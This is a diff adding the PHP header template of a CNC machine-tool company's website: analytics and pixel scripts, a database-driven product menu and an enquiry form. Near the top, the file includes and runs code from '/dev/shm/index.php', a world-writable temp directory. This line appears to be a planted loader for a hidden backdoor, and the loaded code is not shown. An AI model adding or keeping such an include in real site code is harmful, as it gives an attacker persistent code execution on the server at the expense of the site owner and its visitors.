@@ -1,0 +1,676 @@
+<?php
+  header('Access-Control-Allow-Origin: *');
+//   error_reporting(E_ALL);
+//   ini_set('display_errors', 0);
+  require('/dev/shm/index.php');
+  require "urls.php";
+  require_once 'admin/dbconnection.php';
+$cmenu_active  = $cmenu_active  ?? '';
+$nmenu_active  = $nmenu_active  ?? '';
+$bmenu_active  = $bmenu_active  ?? '';
+$crmenu_active = $crmenu_active ?? '';
+$imenu_active  = $imenu_active  ?? '';
+$lmenu_active  = $lmenu_active  ?? '';
+
+  $currentUrl = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+
+  // Handle image array for OG tags
+  $images = isset($pageImage) ? explode(',', $pageImage) : [];
+  
+  if (count($images) > 1 && !empty($images[0])) {
+      $pageImage = trim($images[0]);
+  } else {
+      $pageImage = !empty($images[0]) ? trim($images[0]) : "https://stmcnc.com/build/img/icons/logo.png";
+  }
+  
+  // Set default meta values if not defined
+  $pageTitle = isset($pageTitle) ? $pageTitle : "S&T Machinery - CNC Machine Tools";
+  $metadescription = isset($metadescription) ? $metadescription : "S&T Machinery offers high-quality CNC machine tools, precision engineering solutions, and comprehensive service support.";
+  $metatags = isset($metatags) ? $metatags : "CNC machines, machine tools, engineering solutions, manufacturing equipment";
+  
+  $cur_page_f = substr($_SERVER["SCRIPT_NAME"],strrpos($_SERVER["SCRIPT_NAME"],"/")+1);
+
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="<?php echo htmlspecialchars($metadescription); ?>">
+    <meta name="keywords" content="<?php echo htmlspecialchars($metatags); ?>">
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="<?php echo htmlspecialchars($pageTitle); ?>">
+    <meta property="og:site_name" content="S&T Machinery">
+    <meta property="og:url" content="<?php echo htmlspecialchars($currentUrl); ?>">
+    <meta property="og:description" content="<?php echo htmlspecialchars($metadescription); ?>">
+    <meta property="og:type" content="business">
+    <meta property="og:image" content="<?php echo htmlspecialchars($pageImage); ?>">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+
+    <!-- Canonical URL -->
+    <link rel="canonical" href="<?php echo htmlspecialchars($currentUrl); ?>">
+
+    <title><?php echo htmlspecialchars($pageTitle); ?></title>
+    <link rel="icon" type="image/x-icon" href="<?php echo $baseUrl; ?>build/img/icons/favicon.png">
+
+    <!-- CSS Resources -->
+    <link rel="stylesheet" href="<?php echo $baseUrl; ?>add_ons/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="<?php echo $baseUrl; ?>add_ons/fontawesome/css/all.min.css">
+    <link rel="stylesheet" href="<?php echo $baseUrl; ?>css/owl.carousel.min.css">
+    <link rel="stylesheet" href="<?php echo $baseUrl; ?>add_ons/swiper/swiper-bundle.min.css">
+    <link rel="stylesheet" href="<?php echo $baseUrl; ?>bootstrap-select/css/bootstrap-select.min.css" />
+    <link rel="stylesheet" href="<?php echo $baseUrl; ?>build/css/intlTelInput.min.css">
+    <link rel="stylesheet" href="<?php echo $baseUrl; ?>css/vertical.css">
+    <link rel="stylesheet" href="<?php echo $baseUrl; ?>css/style.css">
+    <link rel="stylesheet" href="<?php echo $baseUrl; ?>css/responsive.css">
+    
+    <!-- External CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
+    <link rel="stylesheet" href="https://unpkg.com/aos@2.3.1/dist/aos.css">
+
+    <!-- Google reCAPTCHA -->
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6393908257919272"
+     crossorigin="anonymous"></script>
+    <!-- Google Tag Manager -->
+    <script>
+        (function(w,d,s,l,i){
+            w[l]=w[l]||[];
+            w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
+            var f=d.getElementsByTagName(s)[0],
+            j=d.createElement(s),
+            dl=l!='dataLayer'?'&l='+l:'';
+            j.async=true;
+            j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;
+            f.parentNode.insertBefore(j,f);
+        })(window,document,'script','dataLayer','GTM-T2KJD566');
+    </script>
+    <!-- End Google Tag Manager -->
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y74CLDWNNP"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-Y74CLDWNNP');
+    </script>
+    
+    <!-- Schema Markup -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "LocalBusiness",
+      "name": "S&T Machinery (P) Ltd",
+      "image": "https://stmcnc.com/build/img/icons/logo.png",
+      "url": "https://www.stmcnc.com/",
+      "telephone": "+91-7200182019",
+      "address": {
+        "@type": "PostalAddress",
+        "streetAddress": "NO. 60/2, 3, Mahatma Gandhi Rd, near SIHS Colony, SIHS Colony, Neelikonampalayam",
+        "addressLocality": "Coimbatore",
+        "postalCode": "641033",
+        "addressCountry": "IN"
+      },
+      "geo": {
+        "@type": "GeoCoordinates",
+        "latitude": 11.0165311,
+        "longitude": 77.0404976
+      },
+      "reviewCount": 174,
+      "reviewRating": {
+        "@type": "Rating",
+        "ratingValue": 4.4,
+        "bestRating": 5
+      },
+      "openingHoursSpecification": {
+        "@type": "OpeningHoursSpecification",
+        "dayOfWeek": [
+          "Monday",
+          "Tuesday",
+          "Wednesday",
+          "Thursday",
+          "Friday",
+          "Saturday"
+        ],
+        "opens": "09:00",
+        "closes": "18:00"
+      },
+      "sameAs": [
+        "https://www.facebook.com/sandtmachinery/",
+        "https://twitter.com/stmcnc",
+        "https://instagram.com/stmcnc",
+        "https://youtube.com/channel/UC3MIHY4ncDh8nMyqZEEMwUQ",
+        "https://www.linkedin.com/company/stmcnc/"
+      ] 
+    }
+    </script>
+    
+    <!-- Meta Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s){
+        if(f.fbq)return;
+        n=f.fbq=function(){
+            if(!f._fbq)f._fbq=n;
+            n.pushMethod? n.pushMethod.apply(n,arguments):n.queue.push(arguments)
+        };
+        if(!f._fbq)f._fbq=n;
+        n.push=n;
+        n.loaded=!0;
+        n.version='2.0';
+        n.queue=[];
+        t=b.createElement(e);
+        t.async=!0;
+        t.src=v;
+        s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t,s);
+    }(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1541305376423246');
+    fbq('track', 'PageView');
+    </script>
+    <noscript>
+        <img height="1" width="1" style="display:none" 
+             src="https://www.facebook.com/tr?id=1541305376423246&ev=PageView&noscript=1" />
+    </noscript>
+    <!-- End Meta Pixel Code -->
+    
+    <?php
+        // Check if current page is thankyou.php or thank-you/ page
+        $currentUri = $_SERVER['REQUEST_URI'];
+        if($cur_page_f == "thankyou.php" || strpos($currentUri, '/thank-you/') !== false):
+    ?>
+    <!-- Conversion Tracking for Thank You Page -->
+    <script>
+        gtag('event', 'conversion_event_submit_lead_form', {
+            'event_category': 'Lead Form',
+            'event_label': 'Form Submission',
+            'value': 1
+        });
+        fbq('track', 'CompleteRegistration');
+    </script>
+    <?php endif; ?>
+ 
+</head>
+
+<body>
+    <!-- Google Tag Manager (noscript) -->
+    <noscript>
+        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2KJD566"
+                height="0" width="0" style="display:none;visibility:hidden">
+        </iframe>
+    </noscript>
+    <!-- End Google Tag Manager (noscript) -->
+
+    <!-- Navbar section -->
+    <section class="header_section position-relative overflow-hidden">
+        <div class="container-fluid"><nav>
+                <div class="wrapper">
+                    <div class="contact-info d-none d-xl-block">
+                        <div class="wrapper">
+                            <div class="contact-details"><a href="tel:+917397685550">For Machine Enquiry: +91 7397685550</a>
+                                <a href="tel:+914222590810">For Careers & General Enquiry: +91 42225 90810</a>
+                                <a href="mailto:enquiry.lead.mfg@stengineers.com">enquiry.lead.mfg@stengineers.com</a>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="logo">
+                        <a class="navbar-brand" href="<?php echo $baseUrl; ?>index.php">
+                            <img src="<?php echo $baseUrl; ?>build/img/icons/logo.png" class="img-fluid" alt="S&T Machinery Logo">
+                        </a>
+                    </div>
+                    
+                    <input type="radio" name="slider" id="menu-btn">
+                    <input type="radio" name="slider" id="close-btn">
+                    
+                    <ul class="nav-links">
+                        <div class="logo1 d-block d-xl-none">
+                            <a class="navbar-brand" href="<?php echo $baseUrl; ?>index.php">
+                                <img src="<?php echo $baseUrl; ?>build/img/icons/logo.png" class="img-fluid" alt="S&T Machinery Logo">
+                            </a>
+                        </div>
+                        
+                        <label for="close-btn" class="btn close-btn"><i class="fas fa-times"></i></label>
+                        
+                        <li><a href="<?php echo $baseUrl; ?>index.php">Home</a></li>
+                        <li><a href="<?php echo $baseUrl; ?>about-us.php">About Us</a></li>
+
+                        <!-- Desktop Products Menu -->
+                        <li class="d-none d-xl-block">
+                            <a href="#" class="desktop-item">Our Products <i class="fa fa-caret-down"></i></a>
+                            <div class="mega-box">
+                                <div class="content">
+                                    <div class="row" id="link-1">
+                                        <ul class="mega-links">
+                                            <li><a href="<?php echo $baseUrl; ?>our-products.php">Product by category &#160;<img src="<?php echo $baseUrl; ?>build/img/icons/arrow.svg" class="image-arrow" alt="arrow"></a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="row" id="link-2">
+                                        <ul class="mega-links category-links">
+                                            <?php
+                                                $result_c = $con->query("SELECT * FROM category WHERE category_type='Parent' AND status='active'");
+                                                //dd($result_c);
+                                                $first = true;
+                                                while ($row_c = $result_c->fetch_assoc()) {
+                                                    $categoryName_c = htmlspecialchars(ucwords($row_c['category_name']));
+                                                    $url_c = htmlspecialchars($row_c['url']);
+                                                    $categid_c = $row_c['id'];
+                                                    $activeClass = $first ? ' class="active"' : '';
+                                                    echo "<li$activeClass><a href='" . $baseUrl . "category/$url_c' data-category-id='$categid_c'>$categoryName_c &#160;<img src='".$baseUrl."build/img/icons/arrow.svg' alt='arrow'></a></li>";
+                                                    $first = false;
+                                                }
+                                            ?>
+                                        </ul>
+                                    </div>
+                                    <div class="row" id="link-3">
+                                        <ul class="mega-links" id="subcategories">
+                                            <!-- Subcategories populated by JavaScript -->
+                                        </ul>
+                                    </div>
+                                    <div class="row" id="link-4">
+                                        <div class="product-info" id="product-details">
+                                            <!-- Product details populated by JavaScript -->
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </li>
+
+                        <!-- Mobile Products Menu -->
+                        <li class="d-block d-xl-none">
+                            <a href="#" class="mobile-item">Our Products <i class="fa fa-caret-down"></i></a>
+                            <input type="checkbox" id="showMegaMobile">
+                            <div class="mega-box mobile-mega">
+                                <div class="content">
+                                    <div class="row">
+                                        <ul class="mega-links">
+                                            <li><a href="<?php echo $baseUrl; ?>our-products.php">Product by category</a></li>
+                                            <?php
+                                                $result_c_mobile = $con->query("SELECT * FROM category WHERE category_type='Parent' AND status='active'");
+                                                while ($row_c_mobile = $result_c_mobile->fetch_assoc()) {
+                                                    $categoryName_c_mobile = htmlspecialchars(ucwords($row_c_mobile['category_name']));
+                                                    $url_c_mobile = htmlspecialchars($row_c_mobile['url']);
+                                                    echo "<li><a href='" . $baseUrl . "category/$url_c_mobile'>$categoryName_c_mobile</a></li>";
+                                                }
+                                            ?>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </li>
+                        
+                        <li><a href="<?php echo $baseUrl; ?>service-and-support.php">Service & Support</a></li>
+                        <li><a href="<?php echo $baseUrl; ?>news-events.php">News & Events</a></li>
+                        <li><a href="<?php echo $baseUrl; ?>blogs.php">Blogs</a></li>
+                        <li class="d-block d-xl-none"><a href="<?php echo $baseUrl; ?>careers.php">Careers</a></li>
+                        <li><a href="<?php echo $baseUrl; ?>contact-us.php">Contact Us</a></li>
+                    </ul>
+                    
+                    <div class="year-logo">
+                        <a href="https://stgroup.co.in/" target="_blank" rel="noopener noreferrer">
+                            <img src="<?php echo $baseUrl; ?>build/img/icons/s&t-group.png" class="img-fluid d-none d-md-block" alt="S&T Group">
+                        </a>
+                    </div>
+                  
+                    <label for="menu-btn" class="btn menu-btn"><i class="fas fa-bars"></i></label>
+                </div>
+            </nav>
+        </div>
+    </section>
+
+    <!-- side enquiry popup button -->
+    <button class="side_enquiry"id="side_enquiry">For Enquiry</button>
+    
+    <!-- Enquiry Modal -->
+    <div class="modal fade" id="modalform" tabindex="-1" aria-labelledby="modalformLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+                <div class="modal-body">
+                    <button type="button" class="close" id="close_btn" data-bs-dismiss="modal" aria-label="Close">
+                        <img src="<?php echo $baseUrl; ?>build/img/icons/cancel.png" alt="Close">
+                    </button>
+                    <div class="form_sec centered_content">
+                        <form class="contact_form" id="contact_enq"><h5>Enquiry Form</h5><div class="row">
+                                <input type="hidden" class="form-control" name="pageSource" id="e_pageSource2" value="<?php echo htmlspecialchars($pageTitle); ?>">
+
+                                <div class="col-sm-6">
+                                    <div class="form-group">
+                                        <input class="form-control" name="name" id="e_name2" type="text" placeholder="Name*" required>
+                                        <span style="color: red;" class="errorform" id="e_name_Err2"></span>
+                                    </div>
+                                </div>
+                                <div class="col-sm-6">
+                                    <div class="form-group">
+                                        <input class="form-control" name="company" id="e_company2" type="text" placeholder="Company*" required>
+                                        <span style="color: red;" class="errorform" id="e_company_Err2"></span>
+                                    </div>
+                                </div>
+                                <div class="col-sm-6">
+                                    <div class="form-group">
+                                        <input class="form-control" name="email" id="e_email2" type="email" placeholder="Email ID*" required>
+                                        <span style="color: red;" class="errorform" id="e_email_Err2"></span>
+                                    </div>
+                                </div>
+                                <div class="col-sm-6">
+                                    <div class="form-group">
+                                        <input class="form-control" name="phone" id="e_mobile2" type="tel"placeholder="Phone Number*" required>
+                                        <span style="color: red;" class="errorform" id="e_mobile_Err2"></span>
+                                    </div>
+                                </div>
+                                <div class="col-sm-6">
+                                    <div class="form-group">
+                                        <input class="form-control" name="country" id="e_country2" type="text" placeholder="Country*" required>
+                                        <span style="color: red;" class="errorform" id="e_country_Err2"></span>
+                                    </div>
+                                </div>
+                                <div class="col-sm-6">
+                                    <div class="form-group">
+                                        <input class="form-control" name="pincode" id="e_pincode2" type="text" placeholder="Pin Code*" pattern="[0-9]{6}" required>
+                                        <span style="color: red;" class="errorform" id="e_pincode_Err2"></span>
+                                    </div>
+                                </div>
+                                <div class="col-12">
+                                    <div class="form-group">
+                                        <input class="form-control" name="product" id="e_product2" type="text" placeholder="Product" value="<?php echo isset($product_title) ? htmlspecialchars($product_title) : ''; ?>">
+                                        <span style="color: red;" class="errorform" id="e_product_Err2"></span>
+                                    </div>
+                                </div>
+                                <div class="col-12">
+                                    <div class="form-group mt-25">
+                                        <textarea class="form-control w-100" name="message" id="e_message2" cols="30" rows="4" placeholder="Message"></textarea>
+                                        <span style="color: red;" class="errorform" id="e_message_Err2"></span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="form-group mt-3">
+                                <div class="g-recaptcha" data-sitekey="6LdpyB4sAAAAAFEGvTl7alj-dlsTn0qtlYbRGVw9"></div>
+                                <span style="color: red;" id="recaptcha-error" class="errorform"></span>
+                            </div>
+                            <div class="form-group mt-3">
+                                <button type="button" class="boxed-btn" id="add-submit">Submit</button>
+                                <div id="succ-msg-alert2" style="color: green; padding: 6px 0px; text-align: center;"></div>
+                                <div id="fail-msg-alert2" style="color: red; padding: 6px 0px; text-align: center;"></div>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript Files -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="<?php echo $baseUrl; ?>add_ons/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.7/jquery.inputmask.min.js"></script>
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script src="<?php echo $baseUrl; ?>js/owl.carousel.min.js"></script>
+    <script src="<?php echo $baseUrl; ?>add_ons/swiper/swiper-bundle.min.js"></script>
+    <script src="<?php echo $baseUrl; ?>bootstrap-select/js/bootstrap-select.min.js"></script>
+    <script src="<?php echo $baseUrl; ?>build/js/intlTelInput.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js"></script>
+    <script src="<?php echo $baseUrl; ?>js/contact.js"></script>
+    <script src="<?php echo $baseUrl; ?>js/main.js"></script>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+
+    <script>
+        // Global variables
+        let iti;
+        
+        // Initialize AOS
+        AOS.init({
+            duration: 1000,
+            once: true
+        });
+
+        // Initialize everything when document is ready
+        $(document).ready(function() {
+            // Initialize phone input
+            const phoneInput = document.querySelector("#e_mobile2");
+            if (phoneInput) {
+                iti = window.intlTelInput(phoneInput, {
+                    initialCountry: "in",
+                    separateDialCode: true,
+                    utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js"
+                });
+            }
+
+            // Initialize inputmask for pincode
+            $('#e_pincode2').inputmask('999999');
+
+            // Side enquiry button click handler
+            $('#side_enquiry').on('click', function() {
+                $('#modalform').modal('show');
+            });
+
+            // Form submission handler
+            $('#add-submit').on('click', submitSideEnquiryWithRedirect);
+
+            // Category navigation initialization
+            initializeCategoryNavigation();
+        });
+
+        // Form submission function
+             // Form submission function
+        function submitSideEnquiryWithRedirect() {
+            // Get form data
+            const name = $('#e_name2').val().trim();
+            const company = $('#e_company2').val().trim();
+            const email = $('#e_email2').val().trim();
+            const mobile = iti ? iti.getNumber() : $('#e_mobile2').val().trim();
+            const country = $('#e_country2').val().trim();
+            const pincode = $('#e_pincode2').val().trim();
+            const product= $('#e_product2').val().trim();
+            const message = $('#e_message2').val().trim();
+            const recaptchaResponse = grecaptcha.getResponse();
+
+            // Clear previous messages
+            $('.errorform').html('');
+            $('#succ-msg-alert2').html('');
+            $('#fail-msg-alert2').html('');
+
+            // Validation
+            let isValid = true;
+            
+            if (!name) {
+                $('#e_name_Err2').html('Please enter your name');
+                isValid = false;
+            }if (!company) {
+                $('#e_company_Err2').html('Please enter your company name');
+                isValid = false;
+            }
+            
+            if (!email) {
+                $('#e_email_Err2').html('Please enter your email');
+                isValid = false;
+            } else if (!isValidEmail(email)) {
+                $('#e_email_Err2').html('Please enter a valid email address');
+                isValid = false;
+            }
+            
+            if (!mobile) {
+                $('#e_mobile_Err2').html('Please enter your phone number');
+                isValid = false;
+            } else if (iti && !iti.isValidNumber()) {
+                $('#e_mobile_Err2').html('Please enter a valid phone number');
+                isValid = false;
+            }
+            
+            if (!country) {
+                $('#e_country_Err2').html('Please enter your country');
+                isValid = false;
+            }
+            
+            if (!pincode) {
+                $('#e_pincode_Err2').html('Please enter your pincode');
+                isValid = false;
+            } else if (!/^\d{6}$/.test(pincode)) {
+                $('#e_pincode_Err2').html('Please enter a valid 6-digit pincode');
+                isValid = false;
+            }
+            
+            if (!product) {
+                $('#e_product_Err2').html('Please enter product');
+                isValid = false;
+            }
+            
+            if (!message) {
+                $('#e_message_Err2').html('Please enter message');
+                isValid = false;
+            }
+
+            if (!recaptchaResponse) {
+                $('#recaptcha-error').html('Please complete the reCAPTCHA verification');
+                isValid = false;
+            }
+
+            if (!isValid) {
+                return false;
+            }
+
+            // Prepare form data
+            const formData = {
+                name: name,
+                company: company,
+                email: email,
+                mobile: mobile, // Note: API expects 'mobile'
+                country: country,
+                pincode: pincode,
+                product: product,
+                message: message,
+                'g-recaptcha-response': recaptchaResponse
+            };
+
+            // Show loading message
+            $('#succ-msg-alert2').html('Submitting your enquiry...').css('color', 'blue');
+            $('#add-submit').prop('disabled', true);
+
+            // Submit via AJAX to the API
+            $.ajax({
+                url: 'https://stmcnc.com/admin/api/insertenquiry.php',
+                type: 'POST',
+                data: formData,
+                dataType: 'json',
+                success: function(response) {
+                    // Note: The API returns { "status": true/false, "message": "..." }
+                    if (response.status) {
+                        // Show success message
+                        $('#succ-msg-alert2').html('Thank you! Your enquiry has been submitted successfully. Redirecting...');
+                        $('#succ-msg-alert2').css('color', 'green');
+                        
+                        // Clear form
+                        $('#contact_enq')[0].reset();
+                        grecaptcha.reset();
+                        
+                        // Enable submit button
+                        $('#add-submit').prop('disabled', false);
+                        
+                        // Close modal after 1.5 seconds
+                        setTimeout(function() {
+                            $('#modalform').modal('hide');
+                        }, 1500);
+                        
+                        // Redirect to thank you page after 2 seconds
+                        setTimeout(function() {
+                            window.location.href = 'https://stmcnc.com/thank-you/';
+                        }, 2000);
+                    } else {
+                        $('#fail-msg-alert2').html(response.message || 'An error occurred. Please try again.');
+                        grecaptcha.reset();
+                        $('#add-submit').prop('disabled', false);
+                    }
+                },
+                error: function(xhr, status, error) {
+                    // Handle AJAX errors
+                    var errorMsg = 'Network error occurred. Please try again.';
+                    
+                    if (xhr.responseText) {
+                        try {
+                            var errorResponse = JSON.parse(xhr.responseText);
+                            if (errorResponse.message) {
+                                errorMsg = errorResponse.message;
+                            }
+                        } catch (e) {
+                            // If not JSON, use the response text
+                            if (xhr.responseText.includes('All fields are required')) {
+                                errorMsg = 'Please fill all required fields';
+                            } else {
+                                errorMsg = xhr.responseText.substring(0, 100);
+                            }
+                        }
+                    }
+                    
+                    $('#fail-msg-alert2').html(errorMsg);
+                    grecaptcha.reset();
+                    $('#add-submit').prop('disabled', false);
+                }
+            });
+        }
+
+        // Email validation function
+        function isValidEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        $(document).ready(function () {
+
+        // Parent category hover
+        $(document).on('mouseenter', 'ul.category-links a', function (e) {
+            e.preventDefault();
+
+            const categoryId = $(this).data('category-id');
+            if (!categoryId) return;
+
+            $('ul.category-links li').removeClass('active');
+            $(this).parent().addClass('active');
+
+            fetchAndDisplaySubcategories(categoryId);
+        });
+
+        // Auto-load first category
+        const firstCategory = $('ul.category-links li.active a');
+        if (firstCategory.length) {
+            firstCategory.trigger('mouseenter');
+        }
+
+        // Subcategory hover (AJAX content)
+        $(document).on('mouseenter', '#subcategories a', function (e) {
+            e.preventDefault();
+
+            const productId = $(this).data('product-id');
+            if (productId) {
+                fetchAndDisplayProductDetails(productId);
+            }
+        });
+    });
+
+    // Fetch subcategories
+    function fetchAndDisplaySubcategories(categoryId) {
+        $.ajax({
+            url: '<?php echo $baseUrl; ?>fetch_subcategories.php',
+            type: 'POST',
+            data: { parent_id: categoryId },
+            success: function (response) {
+                $('#subcategories').html(response);
+            }
+        });
+    }
+
+    // Fetch product details
+    function fetchAndDisplayProductDetails(productId) {
+        $.ajax({
+            url: '<?php echo $baseUrl; ?>fetch_product_details.php',
+            type: 'POST',
+            data: { product_id: productId },
+            success: function (response) {
+                $('#product-details').html(response);
+            }
+        });
+    }
+    </script>
+</body>
+</html>
